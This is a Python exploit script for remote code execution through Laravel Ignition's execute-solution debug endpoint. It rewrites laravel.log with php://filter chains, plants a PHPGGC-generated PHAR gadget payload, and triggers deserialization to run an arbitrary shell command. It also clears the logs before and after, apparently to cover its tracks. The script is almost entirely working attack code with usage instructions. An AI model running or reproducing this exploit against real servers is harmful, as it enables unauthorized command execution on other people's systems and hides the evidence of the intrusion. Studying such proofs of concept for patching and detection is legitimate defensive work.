#!/usr/bin/env python3
import requests
import subprocess
import re
import os
import sys


# Send a post request with a specific viewFile value, returning HTTP response
def send(url='', viewfile=''):
    headers = {
        "Accept": "application/json"
    }
    data = {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "whateverYouWant",
            "viewFile": ""
        }
    }
    data['parameters']['viewFile'] = viewfile
    resp = requests.post(url, json=data, headers=headers, verify=False)
    return resp


# Generate payload and return it as text
def generate(chain='', command=''):
    # Ensure that we have PHPGGC in current directory, if not we'll clone it
    if os.path.exists("phpggc"):
        print("[+] PHPGGC found. Generating payload and deploy it to the target")
    else:
        print("[i] PHPGGC not found. Cloning it")
        os.system("git clone https://github.com/ambionics/phpggc.git")
    payload = subprocess.getoutput(
        r"php -d'phar.readonly=0' ./phpggc/phpggc '%s' system '%s' --phar phar -o php://output | base64 -w0 | "
        r"sed -E 's/./\0=00/g; s/==/=3D=/g; s/$/=00/g'" % (chain, command))
    return payload


# Clear logs,
def clear(url):
    print("[i] Trying to clear logs")
    while (send(url,
                "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf"
                "-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log").status_code != 200):
        continue
    print("[+] Logs cleared")


if __name__ == '__main__':
    if len(sys.argv) < 4:
        print("Usage:   %s <URL> <CHAIN> <CMD>" % sys.argv[0])
        print("Example: %s http(s)://localhost:8000 Monolog/RCE1 whoami" % sys.argv[0])
        print("I recommend to use Monolog/RCE1 or Monolog/RCE2 as CHAIN")
        exit(1)
    url = sys.argv[1] + "/_ignition/execute-solution"
    chain = sys.argv[2]
    command = sys.argv[3]

    # Step 1. Clear logs, write the first log entry
    clear(url)
    send(url, "AA")

    # Step 3. Write the second log entry with encoded PHAR payload
    send(url, generate(chain, command))

    # Step 4. Convert log file to a valid PHAR
    if (send(url,
             "php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64"
             "-decode/resource=../storage/logs/laravel.log").status_code == 200):
        print("[+] Successfully converted logs to PHAR")
    else:
        print("[-] Fail to convert logs to PHAR")

    # Step 5. Trigger PHAR deserialization, extract the output
    response = send(url, "phar://../storage/logs/laravel.log")
    result = re.sub("{[\s\S]*}", "", response.text)
    if result:
        print("[+] PHAR deserialized. Exploited\n")
        print(result)
    else:
        print("[i] There is no output")

    # Clear logs
    clear(url)
